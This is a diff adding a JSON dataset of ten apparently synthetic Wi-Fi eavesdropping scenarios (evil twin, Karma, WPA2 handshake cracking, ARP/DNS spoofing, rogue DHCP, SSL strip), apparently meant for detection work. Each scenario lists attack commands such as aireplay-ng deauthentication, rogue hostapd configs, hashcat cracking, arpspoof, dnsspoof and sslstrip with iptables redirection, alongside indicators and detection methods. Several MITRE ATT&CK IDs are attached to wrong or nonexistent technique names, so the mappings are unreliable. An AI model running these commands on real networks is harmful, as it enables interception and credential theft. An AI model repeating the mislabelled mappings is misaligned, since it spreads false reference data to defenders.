@@ -1,0 +1,269 @@
+{
+  "samples": [
+    {
+      "scenario": "Wi-Fi Eavesdropping via Evil Twin Access Point Capturing HTTPS Metadata and DNS Queries",
+      "technical_data": {
+        "wifi_deauth_command": "aireplay-ng --deauth 10 -a 00:14:6c:7e:40:80 -c 00:0f:b5:88:ac:82 wlan0mon",
+        "hostapd_config_snippet": "interface=wlan0mon\nssid=CoffeeShopWiFi\nchannel=6\nhw_mode=g\nignore_broadcast_ssid=0",
+        "dns_query_capture": "23:15:45.678901 IP client.12345 > 8.8.8.8.53: 1234+ A? example-sensitive.com. (32)\n23:15:45.679123 IP 8.8.8.8.53 > client.12345: 1234 1/0/0 A 93.184.216.34 (48)",
+        "ssl_handshake_metadata": "TLSv1.2 Handshake\n    Server Name: secure.example.com\n    Cipher Suite: TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256",
+        "tcpdump_capture_filter": "port 53 or port 443",
+        "system_log_entries": [
+          "2024-06-01 23:15:40 host kernel: wlan0mon: deauthentication frame detected from 00:14:6c:7e:40:80",
+          "2024-06-01 23:15:41 host hostapd[1023]: AP-STA-CONNECTED 00:0f:b5:88:ac:82"
+        ]
+      },
+      "indicators": [
+        "Multiple deauthentication frames targeting legitimate AP MAC address",
+        "New AP with same SSID but different BSSID appearing on channel",
+        "DNS queries from clients passing through attacker-controlled AP",
+        "TLS handshake metadata without actual payload decryption (metadata only)",
+        "Clients associating with unexpected MAC address for known SSID"
+      ],
+      "detection_method": "Monitor for frequent deauthentication frames and sudden AP BSSID changes in environment. Use wireless intrusion prevention systems to detect rogue APs broadcasting known SSIDs. Analyze DNS traffic for unexpected routing through untrusted devices. Examine TLS handshake metadata for unexpected server names or cipher suites.",
+      "relevant_mitre_techniques": [
+        "T1557.002 - Adversary-in-the-Middle: Wi-Fi Eavesdropping",
+        "T1040 - Network Sniffing",
+        "T1071.001 - Application Layer Protocol: Web Protocols",
+        "T1573.001 - Encrypted Channel: Symmetric Cryptography"
+      ]
+    },
+    {
+      "scenario": "Active Wi-Fi Eavesdropping Using Karma Attack to Capture Cleartext HTTP Credentials",
+      "technical_data": {
+        "airbase_ng_command": "airbase-ng -e \"FreeWiFi\" -c 11 wlan0mon",
+        "tcpdump_http_login": "16:02:34.987654 IP 192.168.1.105.40512 > 198.51.100.25.80: Flags [P.], seq 1:123, ack 1, win 502, length 122\n    POST /login HTTP/1.1\r\n    Host: insecure-login.site\r\n    Content-Type: application/x-www-form-urlencoded\r\n    Content-Length: 49\r\n\r\nusername=alice&password=supersecretpassword",
+        "dhcp_leases_file": "client-00:0a:95:9d:68:16 192.168.1.105 2024-06-02 16:02:30",
+        "arp_cache_entries": "192.168.1.1 at 02:42:ac:11:00:02 [ether] on wlan0mon",
+        "wifi_interface_promisc_status": "wlan0mon: flags=4163<UP,BROADCAST,RUNNING,PROMISC,MULTICAST>",
+        "system_auth_log": "Jun 2 16:02:35 host kernel: wlan0mon: received packet in promiscuous mode"
+      },
+      "indicators": [
+        "Rogue AP broadcasting common SSID with no authentication",
+        "HTTP POST requests containing plaintext credentials captured",
+        "Clients obtaining IP addresses via DHCP from attacker-controlled server",
+        "ARP replies indicating MAC address conflict for gateway IP",
+        "Network interface on attacker in promiscuous mode capturing all packets"
+      ],
+      "detection_method": "Detect rogue APs by validating authorized AP MAC addresses and SSIDs. Monitor HTTP traffic for unencrypted credential submissions. Use DHCP monitoring to identify unauthorized DHCP servers. Employ NIDS signatures for ARP anomalies and promiscuous mode alerts on network adapters.",
+      "relevant_mitre_techniques": [
+        "T1557.002 - Adversary-in-the-Middle: Wi-Fi Eavesdropping",
+        "T1040 - Network Sniffing",
+        "T1071.001 - Application Layer Protocol: Web Protocols",
+        "T1539 - Steal Web Session Cookie"
+      ]
+    },
+    {
+      "scenario": "Wi-Fi Eavesdropping via Passive Sniffing on WPA2-PSK Network Capturing EAPOL Handshake and Cracking Password",
+      "technical_data": {
+        "airmon_ng_start": "airmon-ng start wlan0",
+        "packet_capture_command": "airodump-ng --bssid 00:14:6c:7e:40:80 -c 36 -w capture wlan0mon",
+        "eapol_handshake_packet": "Frame 75: 150 bytes on wire (1200 bits), 150 bytes captured (1200 bits)\nIEEE 802.11 Authentication\n    EAPOL Key (Message 1 of 4): RSN Key Data",
+        "hashcat_crack_command": "hashcat -m 2500 capture.hccapx wordlist.txt",
+        "system_log_capture": "Jun 3 10:22:11 host kernel: wlan0mon: received EAPOL handshake packet"
+      },
+      "indicators": [
+        "Capture of four-way EAPOL handshake packets during client association",
+        "Use of monitor mode for wireless interface",
+        "Presence of cracked WPA2 passphrase from handshake capture",
+        "Repeated probe requests from attacker device scanning target network",
+        "No deauthentication attacks observed (passive sniffing)"
+      ],
+      "detection_method": "Monitor for presence of monitor mode interfaces on network segment. Detect unusual wireless probe requests and repeated client association attempts. Use wireless intrusion detection to identify handshake capture events. Alert on repeated failed authentications or new devices capturing EAPOL packets.",
+      "relevant_mitre_techniques": [
+        "T1557.003 - Adversary-in-the-Middle: WPA Handshake Capture",
+        "T1040 - Network Sniffing",
+        "T1110.001 - Brute Force: Password Guessing",
+        "T1560.001 - Archive Collected Data: Archive via Compression"
+      ]
+    },
+    {
+      "scenario": "Man-in-the-Middle Wi-Fi Eavesdropping Using DNS Spoofing to Redirect Traffic and Capture Credentials",
+      "technical_data": {
+        "dnsspoof_command": "dnsspoof -i wlan0 -f hosts.txt",
+        "hosts_file_content": "93.184.216.34 example.com\n93.184.216.34 login.example.com",
+        "tcpdump_http_redirect": "12:45:11.123456 IP 192.168.10.15.51678 > 93.184.216.34.80: Flags [P.], seq 1:250, ack 1, win 501, length 249\n    GET /login HTTP/1.1\r\n    Host: login.example.com\r\n",
+        "http_post_credentials": "POST /login HTTP/1.1\r\nHost: login.example.com\r\nContent-Type: application/x-www-form-urlencoded\r\n\r\nusername=bob&password=letmein123",
+        "arp_spoofing_command": "arpspoof -i wlan0 -t 192.168.10.15 192.168.10.1",
+        "system_log_alerts": [
+          "2024-06-04 12:45:10 IDS ALERT [ET DNS Spoofing] SRC=192.168.10.15 DST=192.168.10.1",
+          "2024-06-04 12:45:12 WAF INFO HTTP POST credentials submitted to spoofed domain"
+        ]
+      },
+      "indicators": [
+        "ARP replies with conflicting MAC addresses for gateway IP",
+        "DNS responses altered to redirect to attacker-controlled IP",
+        "HTTP POST requests containing cleartext credentials to spoofed domains",
+        "Use of dnsspoof tool in network",
+        "Network interface promiscuous mode enabled during attack"
+      ],
+      "detection_method": "Correlate ARP anomalies with DNS traffic changes and HTTP credential submissions. Detect DNS response inconsistencies via DNSSEC or monitoring. Alert on usage of known DNS spoofing tools or suspicious ARP traffic. Analyze logs for HTTP POST data to untrusted hosts.",
+      "relevant_mitre_techniques": [
+        "T1557.001 - Adversary-in-the-Middle: ARP Spoofing",
+        "T1040 - Network Sniffing",
+        "T1071.001 - Application Layer Protocol: Web Protocols",
+        "T1572 - Protocol Tunneling"
+      ]
+    },
+    {
+      "scenario": "Wi-Fi Eavesdropping via Rogue DHCP Server Providing Malicious Gateway and Capturing Sensitive Traffic",
+      "technical_data": {
+        "dhcp_server_command": "dhcpd -cf rogue-dhcpd.conf wlan0mon",
+        "rogue_dhcpd_conf": "subnet 192.168.50.0 netmask 255.255.255.0 {\n  range 192.168.50.100 192.168.50.200;\n  option routers 192.168.50.254;\n  option domain-name-servers 8.8.8.8;\n}",
+        "tcpdump_http_credentials": "10:33:47.456789 IP 192.168.50.105.51345 > 203.0.113.5.80: Flags [P.], seq 1:100, ack 1, win 501, length 99\n    POST /signin HTTP/1.1\r\n    Host: vulnerable-site.com\r\n    Content-Type: application/x-www-form-urlencoded\r\n\r\nuser=admin&pass=admin123",
+        "arp_cache_on_victim": "192.168.50.254 at 02:42:ac:11:00:02 [ether] on wlan0mon",
+        "system_log_promisc_mode": "Jun 5 10:33:46 host kernel: wlan0mon: promiscuous mode enabled",
+        "network_scan_output": "Nmap scan report for 192.168.50.254\nHost is up (0.00032s latency).\nMAC Address: 02:42:AC:11:00:02 (Unknown)"
+      },
+      "indicators": [
+        "Multiple DHCP offers from unknown MAC address",
+        "Victims receive default gateway IP different from legitimate router",
+        "HTTP POST traffic with cleartext credentials passing through rogue gateway",
+        "Network interface in promiscuous mode on attacker device",
+        "ARP cache poisoning with attacker MAC associated to gateway IP"
+      ],
+      "detection_method": "Detect unauthorized DHCP servers by monitoring DHCP traffic and lease assignments. Verify default gateway MAC addresses against known authorized devices. Monitor HTTP traffic for unencrypted credentials. Use wireless IDS to detect promiscuous mode and rogue device MAC addresses.",
+      "relevant_mitre_techniques": [
+        "T1557.001 - Adversary-in-the-Middle: ARP Spoofing",
+        "T1040 - Network Sniffing",
+        "T1071.001 - Application Layer Protocol: Web Protocols",
+        "T1560.001 - Archive Collected Data: Archive via Compression"
+      ]
+    },
+    {
+      "scenario": "Wi-Fi Eavesdropping via Rogue Access Point Impersonation to Capture SMTP Credentials",
+      "technical_data": {
+        "packet_capture_excerpt": "Frame 27: 150 bytes on wire (1200 bits), 150 bytes captured (1200 bits)\nEthernet II, Src: 02:00:00:aa:bb:cc, Dst: 00:15:5d:00:04:01\nInternet Protocol Version 4, Src: 192.168.1.105, Dst: 192.168.1.1\nTransmission Control Protocol, Src Port: 587, Dst Port: 587\nSimple Mail Transfer Protocol\n    EHLO mail.example.com\r\n    AUTH LOGIN\r\n    dXNlcm5hbWU=\r\n    cGFzc3dvcmQ=\r\n",
+        "rogue_ap_setup_command": "hostapd -B rogue_ap.conf -i wlan0",
+        "rogue_ap_config_snippet": "interface=wlan0\ndriver=nl80211\nssid=FreeWiFi\nchannel=6\nhw_mode=g\nignore_broadcast_ssid=0",
+        "wireshark_display_filter": "smtp.auth",
+        "log_entries": [
+          "2024-06-10 09:15:44 NetworkManager[1234]: Device wlan0 connected to rogue SSID FreeWiFi",
+          "2024-06-10 09:15:45 IDS ALERT [ET SMTP SMTP AUTH Attempt] SRC=192.168.1.105 DST=192.168.1.1"
+        ]
+      },
+      "indicators": [
+        "Unexpected SSID broadcast identical to legitimate corporate Wi-Fi",
+        "Unencrypted SMTP AUTH LOGIN commands captured in packet capture",
+        "Rogue AP MAC address observed in DHCP lease logs not matching authorized APs",
+        "Clients connecting to AP with unusual BSSID (02:00:00:aa:bb:cc)",
+        "Multiple SMTP AUTH attempts over port 587 with Base64 encoded credentials"
+      ],
+      "detection_method": "Wireless intrusion detection systems (WIDS) configured to detect rogue APs broadcasting trusted SSIDs. Monitoring for unencrypted SMTP AUTH packets on the network. Use of DHCP server logs to identify unknown MAC addresses. Correlation of authentication failures and suspicious ARP or DHCP events.",
+      "relevant_mitre_techniques": [
+        "T1557.002 - Adversary-in-the-Middle: Rogue Access Point",
+        "T1040 - Network Sniffing",
+        "T1071.001 - Application Layer Protocol: Web Protocols",
+        "T1110 - Brute Force"
+      ]
+    },
+    {
+      "scenario": "Active Wi-Fi Eavesdropping Using deauthentication Attack to Force Reconnection and Capture WPA2-PSK Handshake",
+      "technical_data": {
+        "airmon_ng_command": "airmon-ng start wlan0",
+        "deauth_attack_command": "aireplay-ng --deauth 10 -a 00:14:bf:3b:3f:80 -c 00:0c:29:6d:8e:1c wlan0mon",
+        "packet_capture_excerpt": "EAPOL Key (Message 1 of 4) captured from STA 00:0c:29:6d:8e:1c to AP 00:14:bf:3b:3f:80\nKey Descriptor Version: 2 (WPA2)\nKey Information: Pairwise key handshake\n",
+        "wireshark_display_filter": "eapol",
+        "system_log_fragment": "Jun 01 12:45:12 host kernel: wlan0mon: deauthentication frame received from 00:14:bf:3b:3f:80",
+        "handshake_capture_file": "wpa2_handshake.cap"
+      },
+      "indicators": [
+        "Repeated deauthentication packets targeting specific client MAC",
+        "Capture of WPA2 4-way handshake packets (EAPOL frames)",
+        "Wireless interface in monitor mode (wlan0mon) during attack",
+        "Sudden client disconnect and reconnect events on AP logs",
+        "Use of aireplay-ng and airmon-ng tools on attacker device"
+      ],
+      "detection_method": "Wireless network monitoring tools detecting excess deauthentication frames. Access point logs showing frequent client disconnects. Correlation of monitor mode interface activation with capture of WPA2 handshake packets. Alerts from wireless IDS on signature of deauth flood attacks.",
+      "relevant_mitre_techniques": [
+        "T1557.002 - Adversary-in-the-Middle: Rogue Access Point",
+        "T1560.002 - Archive Collected Data: Archive via Disk Image",
+        "T1040 - Network Sniffing"
+      ]
+    },
+    {
+      "scenario": "Passive Wi-Fi Eavesdropping on Public Hotspot Capturing Unencrypted FTP Credentials",
+      "technical_data": {
+        "tcpdump_ftp_traffic": "12:12:01.234567 IP 192.168.10.15.49152 > 203.0.113.10.21: Flags [P.], seq 1:36, ack 1, win 65535, length 35\nUSER anonymous\r\n",
+        "ftp_command_sequence": "USER anonymous\r\nPASS guest@\r\n",
+        "wireshark_display_filter": "ftp.request.command == USER or ftp.request.command == PASS",
+        "arp_table_snapshot": "192.168.10.1 at 00:13:ef:45:67:89 [ether] on wlan0",
+        "network_capture_tool": "tcpdump -i wlan0 port 21 -w ftp_capture.pcap",
+        "log_entries": [
+          "2024-06-05 11:58:33 IDS ALERT [ET PROTOCOL FTP Unencrypted Credentials] SRC=192.168.10.15 DST=203.0.113.10"
+        ]
+      },
+      "indicators": [
+        "FTP USER and PASS commands observed in plaintext over Wi-Fi",
+        "ARP cache consistent with default gateway, no spoofing detected",
+        "Clients connected to open or WEP encrypted Wi-Fi network",
+        "No encryption (FTP over port 21) used in file transfer session",
+        "Network sniffing tool capturing FTP control channel traffic"
+      ],
+      "detection_method": "Inspection of FTP traffic on the network for unencrypted credentials. Alerts from IDS on FTP authentication commands in cleartext. Monitoring for unprotected Wi-Fi networks with active FTP sessions. Use of Wi-Fi monitoring tools to verify encryption type of wireless network.",
+      "relevant_mitre_techniques": [
+        "T1040 - Network Sniffing",
+        "T1071.001 - Application Layer Protocol: Web Protocols",
+        "T1557.001 - Adversary-in-the-Middle: ARP Spoofing"
+      ]
+    },
+    {
+      "scenario": "Man-in-the-Middle Wi-Fi Eavesdropping using DNS Spoofing to Redirect Traffic and Capture HTTP Credentials",
+      "technical_data": {
+        "dnsspoof_command": "dnsspoof -i wlan0 host example.com",
+        "packet_capture_excerpt": "DNS Standard query response example.com A 192.168.0.200\nHTTP GET /login HTTP/1.1\r\nHost: example.com\r\nAuthorization: Basic YWRtaW46cGFzc3dvcmQxMjM=\r\n",
+        "arp_table_changes": [
+          "192.168.0.1 at 02:42:ac:11:00:02 [ether] on wlan0  <-- spoofed MAC",
+          "192.168.0.102 at 00:0c:29:3e:5b:ec [ether] on wlan0"
+        ],
+        "wireshark_display_filter": "http.authbasic and dns",
+        "log_entries": [
+          "2024-06-07 08:40:01 IDS ALERT [ET DNS DNS Spoofing Attempt] SRC=192.168.0.105 DST=192.168.0.1",
+          "2024-06-07 08:40:02 WAF WARNING Authorization header with Basic auth detected on HTTP from 192.168.0.102"
+        ]
+      },
+      "indicators": [
+        "DNS responses redirecting legitimate domains to attacker controlled IP",
+        "HTTP traffic containing Basic Authorization headers to spoofed IP",
+        "ARP table entries with conflicting MAC addresses for default gateway",
+        "Use of dnsspoof or similar DNS poisoning tools",
+        "Clients experiencing certificate warnings due to MITM redirection"
+      ],
+      "detection_method": "Network detection systems monitoring DNS response anomalies and ARP spoofing. Correlation between DNS spoofing events and unencrypted HTTP authentication traffic. Endpoints alerting on SSL/TLS certificate mismatches. Wi-Fi monitoring detecting clients connected to unauthorized APs or with unusual ARP mappings.",
+      "relevant_mitre_techniques": [
+        "T1557.001 - Adversary-in-the-Middle: ARP Spoofing",
+        "T1557.003 - Adversary-in-the-Middle: DNS Spoofing",
+        "T1040 - Network Sniffing",
+        "T1071.001 - Application Layer Protocol: Web Protocols"
+      ]
+    },
+    {
+      "scenario": "Wi-Fi Eavesdropping with SSL Strip Attack Capturing HTTP Credentials from HTTPS Downgrade",
+      "technical_data": {
+        "sslstrip_command": "sslstrip -l 8080",
+        "iptables_redirection": "iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080",
+        "packet_capture_excerpt": "GET /login HTTP/1.1\r\nHost: secure.example.com\r\nAuthorization: Basic YWRtaW46c2VjcmV0\r\nUser-Agent: Mozilla/5.0\r\n",
+        "wireshark_display_filter": "http.authbasic",
+        "system_log_fragment": "Jun 08 10:22:45 host kernel: wlan0: promiscuous mode enabled",
+        "log_entries": [
+          "2024-06-08 10:22:50 IDS ALERT [ET POLICY SSL Strip Detected] SRC=192.168.1.50 DST=192.168.1.1",
+          "2024-06-08 10:22:51 WAF WARNING HTTP Basic Auth over HTTP detected from 192.168.1.51"
+        ]
+      },
+      "indicators": [
+        "HTTP traffic with Basic Authorization headers present where HTTPS expected",
+        "iptables redirection rules forwarding port 80 traffic to sslstrip listener",
+        "Network interface in promiscuous mode during attack",
+        "Clients experiencing HTTPS connections downgraded to HTTP",
+        "Use of sslstrip tool on attacker device in Wi-Fi network"
+      ],
+      "detection_method": "IDS detection of SSL strip attack signatures and iptables redirection rules. Monitoring for unexpected HTTP Basic Auth headers on sites usually enforcing HTTPS. Correlation of network interface promiscuous mode with suspicious traffic patterns. Endpoint detection of SSL certificate warnings and unusual HTTP traffic.",
+      "relevant_mitre_techniques": [
+        "T1557.001 - Adversary-in-the-Middle: ARP Spoofing",
+        "T1040 - Network Sniffing",
+        "T1573.001 - Encrypted Channel: Symmetric Cryptography",
+        "T1071.001 - Application Layer Protocol: Web Protocols"
+      ]
+    }
+  ]
+}
